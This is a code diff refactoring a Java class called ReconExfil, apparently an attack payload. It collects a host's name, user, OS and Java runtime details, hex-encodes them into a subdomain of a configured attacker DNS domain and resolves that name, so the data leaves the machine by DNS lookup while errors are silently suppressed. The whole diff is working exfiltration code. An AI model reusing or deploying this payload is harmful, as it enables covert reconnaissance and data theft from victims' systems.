@@ -44,24 +44,12 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         // Silently ignore (don't throw up error messages on stderr)
     }
 
-    void payload(Map<String, String> envVars, Properties javaProps) {
+    private void payload(Map<String, String> envVars, Properties javaProps) {
         if (CONF_EXFIL_DNS == null || CONF_EXFIL_DNS.isEmpty()) {
             return;
         }
 
-        String hostname = getHostname();
-        String username = getUsername(envVars, javaProps);
-        String osInfo = getOsInfo(envVars, javaProps);
-        String runtimeInfo = getRuntimeInfo(javaProps);
-        String uniqueId = getUniqueId();
-
-        String encHostname = encode(hostname);
-        String encUsername = encode(username);
-        String encOsInfo = encode(osInfo);
-        String encRuntimeInfo = encode(runtimeInfo);
-
-        String fullExfilDnsName = encHostname + "." + encUsername + "." + encOsInfo + "." + encRuntimeInfo + "."
-                + uniqueId + "." + CONF_EXFIL_DNS;
+        String fullExfilDnsName = generateEncodedDomainName(envVars, javaProps);
         resolve(fullExfilDnsName);
 
         /*
@@ -79,8 +67,24 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
          */
     }
 
+    String generateEncodedDomainName(Map<String, String> envVars, Properties javaProps) {
+        String hostname = getHostname();
+        String username = getUsername(envVars, javaProps);
+        String osInfo = getOsInfo(javaProps);
+        String runtimeInfo = getRuntimeInfo(javaProps);
+        String uniqueId = getUniqueId();
+
+        String encHostname = encode(hostname);
+        String encUsername = encode(username);
+        String encOsInfo = encode(osInfo);
+        String encRuntimeInfo = encode(runtimeInfo);
+
+        return encHostname + "." + encUsername + "." + encOsInfo + "." + encRuntimeInfo + "."
+                + uniqueId + "." + CONF_EXFIL_DNS;
+    }
+
     // Just hex represent it for now. This is very space inefficient, but at least it's compatible with DNS.
-    static String encode(String input) {
+    private static String encode(String input) {
         if (input == null) {
             input = "null";
         }
@@ -98,7 +102,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
     }
 
     // Use the default system resolver for now
-    static void resolve(String domain) {
+    private static void resolve(String domain) {
         try {
             //noinspection ResultOfMethodCallIgnored
             InetAddress.getByName(domain);
@@ -124,10 +128,11 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
                 username = "unknown";
             }
         }
+
         return username;
     }
 
-    private String getOsInfo(Map<String, String> envVars, Properties javaProps) {
+    private String getOsInfo(Properties javaProps) {
         String osName = javaProps.getProperty("os.name");
         if (isUnknown(osName)) {
             osName = "unknown";
@@ -146,6 +151,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
         if (isUnknown(runtimeVer)) {
             runtimeVer = "unknown";
         }
+
         return runtimeVer;
     }
 
